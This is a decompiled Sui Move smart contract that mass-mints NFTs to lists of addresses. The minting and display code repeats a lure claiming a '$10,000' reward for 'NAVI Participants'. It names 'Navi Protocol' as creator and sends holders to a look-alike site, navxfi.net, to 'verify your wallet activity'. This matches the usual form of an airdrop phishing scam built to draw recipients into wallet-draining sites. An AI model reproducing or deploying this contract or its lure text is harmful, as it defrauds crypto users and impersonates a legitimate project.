module 0x99581e2f32369b9bba65abd1c950df9f82e3f8dc064d277b8857d98288b7e::navi_reward_w12 {
    struct NAVI_REWARD_W12 has drop {
        dummy_field: bool,
    }

    struct NAVI_REWARD has store, key {
        id: 0x2::object::UID,
        name: 0x1::string::String,
        image_url: 0x1::string::String,
        description: 0x1::string::String,
        Reward: 0x1::string::String,
    }

    struct MintEvent has copy, drop {
        nft_id: 0x2::object::ID,
        user: address,
        name: 0x1::string::String,
        image_url: 0x1::string::String,
        description: 0x1::string::String,
        Reward: 0x1::string::String,
    }

    struct BurnEvent has copy, drop {
        nft_id: 0x2::object::ID,
        user: address,
        name: 0x1::string::String,
        image_url: 0x1::string::String,
        description: 0x1::string::String,
        Reward: 0x1::string::String,
    }

    public entry fun MultiMint(arg0: vector<address>, arg1: &mut 0x2::tx_context::TxContext) {
        while (0x1::vector::length<address>(&arg0) > 0) {
            let v0 = NAVI_REWARD{
                id          : 0x2::object::new(arg1),
                name        : 0x1::string::utf8(b"NAVI Reward"),
                image_url   : 0x1::string::utf8(b"ipfs://QmfNzNtj8btaqxuNyGrYrjYU3FoTTmMDtW9uqAfN2BBDh1"),
                description : 0x1::string::utf8(b"Exclusive Rewards for NAVI Participants are ready at https://navxfi.net! Verify your wallet activity and claim Reward."),
                Reward      : 0x1::string::utf8(b"$10,000"),
            };
            let v1 = MintEvent{
                nft_id      : 0x2::object::id<NAVI_REWARD>(&v0),
                user        : 0x2::tx_context::sender(arg1),
                name        : 0x1::string::utf8(b"NAVI Reward"),
                image_url   : 0x1::string::utf8(b"ipfs://QmfNzNtj8btaqxuNyGrYrjYU3FoTTmMDtW9uqAfN2BBDh1"),
                description : 0x1::string::utf8(b"Exclusive Rewards for NAVI Participants are ready at https://navxfi.net! Verify your wallet activity and claim Reward."),
                Reward      : 0x1::string::utf8(b"$10,000"),
            };
            0x2::event::emit<MintEvent>(v1);
            0x2::transfer::public_transfer<NAVI_REWARD>(v0, 0x1::vector::pop_back<address>(&mut arg0));
        };
    }

    public entry fun burn_nft(arg0: NAVI_REWARD, arg1: &mut 0x2::tx_context::TxContext) {
        let NAVI_REWARD {
            id          : v0,
            name        : v1,
            image_url   : v2,
            description : v3,
            Reward      : v4,
        } = arg0;
        let v5 = v0;
        let v6 = BurnEvent{
            nft_id      : 0x2::object::uid_to_inner(&v5),
            user        : 0x2::tx_context::sender(arg1),
            name        : v1,
            image_url   : v2,
            description : v3,
            Reward      : v4,
        };
        0x2::event::emit<BurnEvent>(v6);
        0x2::object::delete(v5);
    }

    fun init(arg0: NAVI_REWARD_W12, arg1: &mut 0x2::tx_context::TxContext) {
        let v0 = 0x1::vector::empty<0x1::string::String>();
        let v1 = &mut v0;
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"name"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"image_url"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"description"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"creator"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"Reward"));
        let v2 = 0x1::vector::empty<0x1::string::String>();
        let v3 = &mut v2;
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"NAVI Reward"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"ipfs://QmfNzNtj8btaqxuNyGrYrjYU3FoTTmMDtW9uqAfN2BBDh1"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"Exclusive Rewards for NAVI Participants are ready at https://navxfi.net! Verify your wallet activity and claim Reward."));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"Navi Protocol"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"$10,000"));
        let v4 = 0x2::package::claim<NAVI_REWARD_W12>(arg0, arg1);
        let v5 = 0x2::display::new_with_fields<NAVI_REWARD>(&v4, v0, v2, arg1);
        0x2::display::update_version<NAVI_REWARD>(&mut v5);
        0x2::transfer::public_transfer<0x2::package::Publisher>(v4, 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::display::Display<NAVI_REWARD>>(v5, 0x2::tx_context::sender(arg1));
    }

    // decompiled from Move bytecode v6
}

